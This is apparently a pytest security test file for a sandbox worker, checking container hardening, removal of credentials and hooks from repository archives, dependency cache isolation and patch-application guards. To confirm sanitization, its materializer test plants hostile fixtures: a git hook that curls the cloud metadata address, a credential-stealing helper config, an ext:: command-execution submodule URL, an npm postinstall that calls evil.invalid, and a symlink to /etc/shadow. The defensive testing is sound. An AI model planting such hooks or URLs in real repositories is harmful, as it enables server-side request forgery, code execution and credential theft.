"""Unit & security tests for `U15` profile manifests, `.git`-sanitized materializer,
tenant read-only dependency cache, and Sandbox B unified diff applier.

Covers `SAN-02`, `SAN-03`, `T-SAN-02-P`, `T-SAN-02-N`, `T-SAN-03-P`, `T-SAN-03-N`,
`SEC-006`, `SEC-007`, `SEC-014`, `SEC-032`, and `SEC-036`.
"""

from __future__ import annotations

import dataclasses
import hashlib
import io
import json
import os
import stat
import tarfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from py_contracts.primitives import new_uuid7
from py_contracts.worker import (
    SandboxJobV1,
    SandboxResourceLimits,
    load_reviewed_profile_manifests,
)
from red2pr_worker import (
    REVIEWED_PROFILE_MANIFESTS,
    DependencyCacheIntegrityError,
    EphemeralWorkspaceCleaner,
    PatchApplyError,
    SandboxIsolationUnavailableError,
    SourceArchiveMaterializer,
    TenantDependencyCacheManager,
    UnsafeSourceArchiveError,
    apply_unified_diff_to_worktree,
    build_hardened_oci_invocation,
    resolve_default_profiles_dir,
    validate_oci_invocation_security,
)


def _make_job_for_profile(
    profile_id: str,
    command_ids: list[str],
    *,
    image_digest: str,
) -> SandboxJobV1:
    now = datetime(2026, 10, 28, 12, 0, 0, tzinfo=UTC)
    return SandboxJobV1(
        job_id=new_uuid7(now=now),
        workspace_id=new_uuid7(now=now),
        repository_id=new_uuid7(now=now),
        repair_id=new_uuid7(now=now),
        lease_epoch=1,
        capability_nonce="nonce_u15_manifest_01",
        issued_at=now,
        expires_at=now + timedelta(minutes=5),
        base_sha="1" * 40,
        source_archive_digest="2" * 64,
        dependency_lock_digest="3" * 64,
        profile_id=profile_id,
        profile_revision=1,
        image_digest=image_digest,
        command_ids=command_ids,
        resource_limits=SandboxResourceLimits(
            cpu=2,
            memory_bytes=2_147_483_648,
            disk_bytes=10_737_418_240,
            pids=256,
            wall_seconds=120,
            output_bytes=1_048_576,
        ),
        network_policy_digest="4" * 64,
        artifact_upload_capability="cap_u15_ticket_v1",
        expected_worker_trust_domain="red2pr.internal",
        supervisor_policy_digest="5" * 64,
    )


def test_reviewed_runner_profile_manifests_and_oci_hardening(tmp_path: Path) -> None:
    profiles_dir = resolve_default_profiles_dir()
    loaded = load_reviewed_profile_manifests(profiles_dir)
    assert set(loaded) == {
        "python-pytest-linux",
        "node-jest-linux",
        "node-vitest-linux",
        "custom-linux-declared",
    }
    assert set(REVIEWED_PROFILE_MANIFESTS) == set(loaded)

    # Node profiles enforce npm_config_ignore_scripts=true & offline execution (SEC-006/SEC-014)
    for node_id in ("node-jest-linux", "node-vitest-linux"):
        manifest = loaded[node_id]
        assert manifest.default_env["npm_config_ignore_scripts"] == "true"
        assert manifest.default_env["npm_config_offline"] == "true"

    # Python profile enforces offline wheelhouse/uv defaults
    py_manifest = loaded["python-pytest-linux"]
    assert py_manifest.default_env["PIP_NO_INDEX"] == "1"
    assert py_manifest.default_env["UV_OFFLINE"] == "1"

    cleaner = EphemeralWorkspaceCleaner(tmp_path / "sbx")
    seccomp = tmp_path / "seccomp.json"
    dep_cache = tmp_path / "dep-cache-entry"
    dep_cache.mkdir()
    seccomp.write_text("{}", encoding="utf-8")

    jest_job = _make_job_for_profile(
        "node-jest-linux",
        ["jest-repro"],
        image_digest=loaded["node-jest-linux"].image_digest,
    )
    dirs = cleaner.prepare_job_directories(jest_job.job_id)
    inv = build_hardened_oci_invocation(
        jest_job,
        dirs=dirs,
        runtime_binary="podman",
        isolation_mode="oci_rootless",
        seccomp_profile_path=seccomp,
        readonly_dep_cache_dir=dep_cache,
    )
    validate_oci_invocation_security(inv)
    assert "--network=none" in inv.cli_args
    assert "--read-only" in inv.cli_args
    assert inv.guest_env["npm_config_ignore_scripts"] == "true"
    assert any(m.endswith(":/dep-cache:ro,noexec,nosuid,nodev,Z") for m in inv.mounts)

    # SEC-036: mounting /dep-cache read-write must fail closed
    rw_mounts = tuple(
        m.replace(":/dep-cache:ro,noexec,nosuid,nodev,Z", ":/dep-cache:rw") for m in inv.mounts
    )
    rw_cli = tuple(
        a.replace(":/dep-cache:ro,noexec,nosuid,nodev,Z", ":/dep-cache:rw") for a in inv.cli_args
    )
    bad_inv = dataclasses.replace(inv, mounts=rw_mounts, cli_args=rw_cli)
    with pytest.raises(SandboxIsolationUnavailableError, match="read-only"):
        validate_oci_invocation_security(bad_inv)

    # Custom profile requires isolated VM tier (ADR-018 / doc10)
    custom_manifest = loaded["custom-linux-declared"]
    assert custom_manifest.requires_isolated_vm_tier is True
    assert custom_manifest.requires_admin_opt_in is True
    custom_job = _make_job_for_profile(
        "custom-linux-declared",
        ["declared-repro"],
        image_digest=custom_manifest.image_digest,
    )
    custom_dirs = cleaner.prepare_job_directories(custom_job.job_id)
    with pytest.raises(SandboxIsolationUnavailableError, match="vm_isolated"):
        build_hardened_oci_invocation(
            custom_job,
            dirs=custom_dirs,
            runtime_binary="podman",
            isolation_mode="oci_rootless",
            seccomp_profile_path=seccomp,
        )

    vm_inv = build_hardened_oci_invocation(
        custom_job,
        dirs=custom_dirs,
        runtime_binary="kata-runtime",
        isolation_mode="vm_isolated",
        seccomp_profile_path=seccomp,
    )
    validate_oci_invocation_security(vm_inv)


def test_materializer_strips_git_hooks_credentials_ssrf_submodules_and_is_deterministic(
    tmp_path: Path,
) -> None:
    repo_dir = tmp_path / "untrusted_repo"
    (repo_dir / ".git" / "hooks").mkdir(parents=True)
    (repo_dir / ".git" / "hooks" / "post-checkout").write_text(
        "#!/bin/sh\ncurl http://169.254.169.254/pwn\n",
        encoding="utf-8",
    )
    (repo_dir / ".git" / "config").write_text(
        "[core]\nfsmonitor = /tmp/evil.sh\n[credential]\nhelper = !/tmp/steal.sh\n",
        encoding="utf-8",
    )
    (repo_dir / ".env").write_text("DATABASE_PASSWORD=super_secret\n", encoding="utf-8")
    (repo_dir / ".git-credentials").write_text(
        "https://user:ghp_secret@github.com\n",
        encoding="utf-8",
    )
    (repo_dir / ".npmrc").write_text(
        "registry=https://registry.npmjs.org/\n"
        "//registry.npmjs.org/:_authToken=npm_SuperSecretToken123\n"
        "strict-ssl=true\n",
        encoding="utf-8",
    )
    (repo_dir / ".gitmodules").write_text(
        '[submodule "metadata-ssrf"]\n'
        "    path = vendor/meta\n"
        "    url = http://169.254.169.254/latest/meta-data/\n"
        '[submodule "private-rfc1918"]\n'
        "    path = vendor/internal\n"
        "    url = https://10.12.0.5/corp/secret.git\n"
        '[submodule "ext-rce"]\n'
        "    path = vendor/rce\n"
        "    url = ext::sh -c touch% /tmp/pwn\n"
        '[submodule "clean-public"]\n'
        "    path = vendor/public\n"
        "    url = https://github.com/example/public-lib.git\n",
        encoding="utf-8",
    )
    (repo_dir / "package.json").write_text(
        json.dumps(
            {
                "name": "demo-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node -e \"require('http').get('http://evil.invalid')\"",
                    "test": "vitest run",
                },
            }
        ),
        encoding="utf-8",
    )
    (repo_dir / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="utf-8")
    (repo_dir / "setup.py").write_text(
        "from setuptools import setup\nsetup(name='evil')\n",
        encoding="utf-8",
    )
    (repo_dir / "src").mkdir()
    (repo_dir / "src" / "math.ts").write_text(
        "export const add = (a: number, b: number) => a - b;\n",
        encoding="utf-8",
    )

    materializer = SourceArchiveMaterializer()
    snap1 = materializer.materialize_directory(repo_dir, base_sha="a" * 40)
    snap2 = materializer.materialize_directory(repo_dir, base_sha="a" * 40)

    # Byte-for-byte deterministic archive & lock digest
    assert snap1.archive_bytes == snap2.archive_bytes
    assert snap1.source_archive_digest == snap2.source_archive_digest
    assert snap1.dependency_lock_digest == snap2.dependency_lock_digest
    assert snap1.has_verified_lockfile is True
    assert "pnpm-lock.yaml" in snap1.matched_lockfiles

    # Inspect produced tar archive
    with tarfile.open(fileobj=io.BytesIO(snap1.archive_bytes), mode="r:gz") as tf:
        names = set(tf.getnames())
        assert not any(n.startswith(".git/") or n == ".git" for n in names)
        assert ".env" not in names
        assert ".git-credentials" not in names
        npmrc_member = tf.extractfile(".npmrc")
        assert npmrc_member is not None
        npmrc_txt = npmrc_member.read().decode("utf-8")
        assert "_authToken" not in npmrc_txt
        assert "registry=https://registry.npmjs.org/" in npmrc_txt

        gitmod_member = tf.extractfile(".gitmodules")
        assert gitmod_member is not None
        gitmod_txt = gitmod_member.read().decode("utf-8")
        assert "169.254.169.254" not in gitmod_txt
        assert "10.12.0.5" not in gitmod_txt
        assert "ext::" not in gitmod_txt
        assert "https://github.com/example/public-lib.git" in gitmod_txt

    assert len(snap1.stripped_git_paths) >= 2
    assert len(snap1.blocked_submodules) == 3
    assert ".npmrc" in snap1.sanitized_auth_files
    assert any("postinstall" in h for h in snap1.detected_lifecycle_hooks)
    assert any("setup.py" in h for h in snap1.detected_lifecycle_hooks)

    # Reject tar containing traversal or symlink
    bad_buf = io.BytesIO()
    with tarfile.open(fileobj=bad_buf, mode="w:gz") as tf:
        sym = tarfile.TarInfo(name="evil_link")
        sym.type = tarfile.SYMTYPE
        sym.linkname = "/etc/shadow"
        tf.addfile(sym)
    with pytest.raises(UnsafeSourceArchiveError):
        materializer.materialize_tar_bytes(bad_buf.getvalue(), base_sha="b" * 40)


def test_tenant_dependency_cache_isolation_and_tamper_eviction(tmp_path: Path) -> None:
    cache_mgr = TenantDependencyCacheManager(tmp_path / "dep-cache")
    ws_a = "019a0000-0000-7000-8000-000000000001"
    ws_b = "019a0000-0000-7000-8000-000000000002"
    lock_digest = hashlib.sha256(b"uv.lock:v1").hexdigest()

    entry_a = cache_mgr.populate_cache_entry(
        workspace_id=ws_a,
        profile_id="python-pytest-linux",
        dependency_lock_digest=lock_digest,
        files={
            "wheels/pkg_a-1.0.0-py3-none-any.whl": b"PK\x03\x04verified_wheel_bytes",
        },
    )
    assert entry_a.is_dir()

    # Workspace A resolves verified read-only directory; Workspace B gets None (SEC-032)
    resolved_a = cache_mgr.resolve_verified_readonly_dir(
        workspace_id=ws_a,
        profile_id="python-pytest-linux",
        dependency_lock_digest=lock_digest,
    )
    assert resolved_a == entry_a
    assert (
        cache_mgr.resolve_verified_readonly_dir(
            workspace_id=ws_b,
            profile_id="python-pytest-linux",
            dependency_lock_digest=lock_digest,
        )
        is None
    )

    # Tamper with cached wheel -> detected and evicted fail-closed (SEC-036)
    wheel_file = entry_a / "wheels" / "pkg_a-1.0.0-py3-none-any.whl"
    os.chmod(entry_a, stat.S_IRWXU)
    os.chmod(wheel_file.parent, stat.S_IRWXU)
    os.chmod(wheel_file, stat.S_IRWXU)
    wheel_file.write_bytes(b"TAMPERED_MALICIOUS_WHEEL")

    with pytest.raises(DependencyCacheIntegrityError, match="Tampered cached dependency file"):
        cache_mgr.resolve_verified_readonly_dir(
            workspace_id=ws_a,
            profile_id="python-pytest-linux",
            dependency_lock_digest=lock_digest,
        )
    assert not entry_a.exists()


def test_apply_unified_diff_to_worktree_and_negative_guards(tmp_path: Path) -> None:
    wt = tmp_path / "sandbox_b_wt"
    (wt / "src").mkdir(parents=True)
    (wt / "src" / "calc.py").write_text(
        "def divide(a: int, b: int) -> float:\n    return a * b\n",
        encoding="utf-8",
        newline="\n",
    )

    valid_diff = (
        "--- a/src/calc.py\n"
        "+++ b/src/calc.py\n"
        "@@ -1,2 +1,4 @@\n"
        " def divide(a: int, b: int) -> float:\n"
        "-    return a * b\n"
        "+    if b == 0:\n"
        "+        raise ValueError('zero divisor')\n"
        "+    return a / b\n"
    )
    digest = hashlib.sha256(valid_diff.encode("utf-8")).hexdigest()

    # Wrong digest rejected
    with pytest.raises(PatchApplyError, match="digest"):
        apply_unified_diff_to_worktree(wt, valid_diff, expected_patch_digest="0" * 64)

    changed = apply_unified_diff_to_worktree(wt, valid_diff, expected_patch_digest=digest)
    assert changed == ("src/calc.py",)
    assert "return a / b" in (wt / "src" / "calc.py").read_text(encoding="utf-8")

    # Re-applying the same diff to the already-patched tree fails hunk verification
    with pytest.raises(PatchApplyError, match="mismatch"):
        apply_unified_diff_to_worktree(wt, valid_diff, expected_patch_digest=digest)

    # Modifying .git or traversing outside worktree is rejected
    git_diff = "--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1,2 @@\n+#!/bin/sh\n+exit 1\n"
    git_digest = hashlib.sha256(git_diff.encode("utf-8")).hexdigest()
    with pytest.raises(PatchApplyError, match=r"\.git"):
        apply_unified_diff_to_worktree(wt, git_diff, expected_patch_digest=git_digest)
